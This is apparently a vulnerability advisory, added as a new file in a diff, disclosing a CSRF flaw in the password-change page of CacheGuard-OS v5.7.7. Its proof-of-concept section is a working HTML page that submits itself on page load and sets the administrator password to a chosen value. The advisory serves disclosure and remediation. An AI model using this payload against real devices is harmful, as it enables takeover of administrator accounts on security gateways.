@@ -1,0 +1,104 @@
+I. VULNERABILITY
+
+-------------------------
+
+CSRF vulnerabilities in CacheGuard-OS v5.7.7
+
+II. BACKGROUND
+
+-------------------------
+
+CacheGuard is an All-in-One Web Security Gateway providing firewall,
+web antivirus, caching, compression, URL filtering, proxy, high
+availability, content filtering, bandwidth saving, bandwidth shaping,
+Quality of Service and more.
+
+
+
+III. DESCRIPTION
+
+-------------------------
+
+Has been detected a CSRF  vulnerability in CacheGuard in
+"/gui/password-wadmin.apl"
+
+
+
+IV. PROOF OF CONCEPT
+
+-------------------------
+
+The application does not validate the parameter any csrf_token
+"/gui/password-wadmin.apl".
+
+
+
+<html>
+
+
+
+<body onload="CSRF.submit();">
+
+<br>
+
+<br>
+
+
+
+<form id="CSRF" action="https://10.200.210.123:8090/gui/password-wadmin.apl"
+method="post" name="CSRF">
+
+<input name="password1" value="admin@1234" type=hidden> </input>
+
+<input name="password2" value="admin@1234" type=hidden> </input>
+
+</form>
+
+
+
+</body>
+
+</html>
+
+
+
+V. BUSINESS IMPACT
+
+-------------------------
+
+
+
+CSRF allow the execution attackers to modify settings or change
+password of user administrator in CacheGuard, because this functions
+are not protected by CSRF-Tokens.
+
+
+
+VI. REQUIREMENTS
+
+-----------------------
+
+An Attacker needs to know the IP of the device.
+
+An Administrator needs an authenticated connection to the device.
+
+
+
+VII. SYSTEMS AFFECTED
+
+-------------------------
+
+Try CacheGuard-OS v5.7.7
+
+
+
+VIII. SOLUTION
+
+-------------------------
+
+All functions must be protected by CSRF-Tokens.
+
+http://www.kb.cert.org/vuls/id/241508
+
+By William Costa
+william.costa no spam gmail.com
